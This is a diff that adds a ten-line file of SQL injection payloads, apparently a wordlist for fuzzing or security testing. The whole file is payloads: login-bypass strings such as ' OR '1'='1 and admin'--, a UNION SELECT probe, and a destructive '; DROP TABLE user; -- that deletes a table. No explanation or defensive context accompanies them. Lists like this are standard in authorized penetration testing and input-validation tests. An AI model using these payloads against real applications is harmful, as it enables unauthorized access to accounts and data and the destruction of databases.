@@ -1,0 +1,10 @@
+' OR '1'='1
+' OR 1=1 --
+' OR 1=1/*
+admin'--
+admin' #
+' UNION SELECT 1,2,3 --
+'; DROP TABLE user; --
+' OR ''='
+' OR 'x'='x
+1' OR '1' = '1
